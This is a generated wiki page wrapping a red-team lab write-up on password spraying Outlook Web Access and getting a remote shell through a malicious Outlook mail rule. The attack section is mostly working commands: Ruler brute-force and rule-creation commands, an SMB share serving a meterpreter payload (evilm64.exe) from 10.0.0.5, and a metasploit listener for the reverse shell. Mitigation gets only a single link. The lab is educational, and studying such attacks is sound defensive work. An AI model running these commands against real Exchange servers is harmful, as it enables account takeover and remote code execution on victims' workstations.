---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Password Spraying Outlook Web Access: Remote Shell

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-initial-access-password-spraying-outlook-web-access-remote-shell` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Password Spraying Outlook Web Access: Remote Shell](../../topics/offensive-security/password-spraying-outlook-web-access-remote-shell.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-initial-access-password-spraying-outlook-web-access-remote-shell |
| name | Password Spraying Outlook Web Access: Remote Shell |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2018-12-23 15-07.gif
- Peek 2018-12-23 18-13.gif
- Screenshot from 2018-12-23 15-08-18.png
- Screenshot from 2018-12-23 15-09-03.png
- Screenshot from 2018-12-23 17-15-36.png
- Screenshot from 2018-12-23 18-17-10.png
_body: "# Password Spraying Outlook Web Access: Remote Shell\n\n## Context\n\nThis lab looks at an attacking technique called\
  \ password spraying as well as abusing Outlook Web Application by exploiting mail rules to get a remote shell using a tool\
  \ called `Ruler`.\n\n## Defininitions\n\n**Password spraying** is a form of password brute-forcing attack. In password spraying,\
  \ an attacker (with the help of a tool) cycles through a list of possible usernames (found using OSINT techniques against\
  \ a target company or other means) with a couple of most commonly used weak passwords.&#x20;\n\nIn comparison, a traditional\
  \ brute-force works by selecting a username from the list and trying all the passwords in the wordlist against that username.\
  \ Once all passwords are exhausted for that user name, another username is chosen from the list and the process repeats.\n\
  \nPassword spraying could be illustrated with the following table:\n\n| User | Password      |\n| ---- | ------------- |\n\
  | john | Winter2018    |\n| ben  | Winter2018    |\n| ...  | Winter2018    |\n| john | December2018! |\n| ben  | December2018!\
  \ |\n| ...  | December2018! |\n\nStandard password brute-forcing could be illustrated with the following table:\n\n| User\
  \ | Password    |\n| ---- | ----------- |\n| john | Winter2018  |\n| john | Winter2018! |\n| john | Password1   |\n| ben\
  \  | Winter2018  |\n| ben  | Winter2018! |\n| ben  | Password1   |\n\n## Password Spraying\n\nLet's try doing a password\
  \ spray against an Exchange 2016 server in a `offense.local` domain:\n\n{% code title=\"attacker@kali\" %}\n```csharp\n\
  ruler -k --domain offense.local brute --users users --passwords passwords --verbose\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-12-23 15-09-03.png>)\n\n![](<../../.gitbook/assets/Peek 2018-12-23 15-07.gif>)\n\nThe above shows that password\
  \ spray was successful against the user `spotless` who used a weak password `123456`.\n\nNote, that if you are attempting\
  \ to replicate this technique in your own labs, you may need to update your `/etc/hosts` to point to your Exchange server:\n\
  \n![](<../../.gitbook/assets/Screenshot from 2018-12-23 15-08-18.png>)\n\n## Getting a Shell via Malicious Email Rule\n\n\
  ### Process Overview\n\nIf the password spray against an Exchange server was successful and you have obtained valid credentials,\
  \ you can now leverage `Ruler` to create a malicious email rule to that will gain you remote code execution on the host\
  \ that checks that compromised mailbox.\n\nA high level overwiew of how the spraying and remote code execution works:\n\n\
  * assume you have obtained working credentials during the spray for the user `spotless@offense.local`\n* with the help of\
  \ `Ruler`, a malicious mail rule is created for the compromised account which in our case is `spotless@offense.local`. The\
  \ rule created will conform to the format along the lines of:\\\n  `if emailSubject contains`` `**`someTriggerWord`**_`start`_**`pathToSomeProgram`**\n\
  * A new email with subject containing `someTriggerWord` is sent to the `spotless@offense.local`\n* User `spotless` logs\
  \ on to his/her workstation and launches Outlook client to check for new email\n* Malicious email comes in and the malicious\
  \ mail rule is triggered, which in turn starts the program specified in `pathToSomeProgram` which is pointing to a malicious\
  \ payload giving a reverse shell to the attacker\n\n### Execution\n\nLet's validate the compromised credentials are working\
  \ by checking if there are any email rules created already:\n\n{% code title=\"attacker@kali\" %}\n```csharp\nruler -k --verbose\
  \ --email spotless@offense.local -u spotless -p 123456  display\n```\n{% endcode %}\n\nThe below suggests the credentials\
  \ are working and that no mail rules are set for this account yet:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-23\
  \ 17-15-36.png>)\n\nTo carry out the attack further, I've generated a reverse meterpreter payload and saved it as a windows\
  \ executable in `/root/tools/evilm64.exe`&#x20;\n\nWe now need to create an SMB share that is accessible to our victim host\
  \ and point it to the location where our payload evilm64.exe is located:\n\n{% code title=\"attacker@kali\" %}\n```csharp\n\
  smbserver.py tools /root/tools/\n```\n{% endcode %}\n\nNext, we setup a metasploit listener to catch the incoming reverse\
  \ shell:\n\n{% code title=\"attacker@kali\" %}\n```csharp\nuse exploit/multi/handler \nset lhost 10.0.0.5\nset lport 443\n\
  exploit\n```\n{% endcode %}\n\nFinally, we fire up the ruler and create the malicious email rule:\n\n{% code title=\"attacker@kali\"\
  \ %}\n```csharp\nruler -k --verbose --email spotless@offense.local --username spotless -p 123456  add --location '\\\\10.0.0.5\\\
  tools\\\\evilm64.exe' --trigger \"popashell\" --name maliciousrule --send --subject popashell\n```\n{% endcode %}\n\nBelow\
  \ shows the entire attack and all of the steps mentioned above in action - note how the compromised mailbox does not even\
  \ get to see the malicious email coming in:\n\n![](<../../.gitbook/assets/Peek 2018-12-23 18-13.gif>)\n\nBelow shows the\
  \ actual malicious rule that got created as part of the attack - note the `subject` and the `start` properties - we specified\
  \ them in the ruler command:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-23 18-17-10.png>)\n\nIf you want to delete\
  \ the malicious email rule, do this:\n\n{% code title=\"attacker@kali\" %}\n```csharp\nruler -k --verbose --email spotless@offense.local\
  \ --username spotless -p 123456 delete --name maliciousrule\n```\n{% endcode %}\n\n## Detection & Mitigation\n\n{% embed\
  \ url=\"https://www.microsoft.com/en-us/microsoft-365/blog/2018/03/05/azure-ad-and-adfs-best-practices-defending-against-password-spray-attacks/\"\
  \ %}\n\n## References\n\n{% embed url=\"https://github.com/sensepost/ruler/wiki\" %}\n\n{% embed url=\"https://silentbreaksecurity.com/malicious-outlook-rules/\"\
  \ %}\n\n{% embed url=\"https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/\" %}\n\n{% embed url=\"https://www.blackhillsinfosec.com/introducing-mailsniper-a-tool-for-searching-every-users-email-for-sensitive-data/\"\
  \ %}"
_relative_path: offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell.md
````
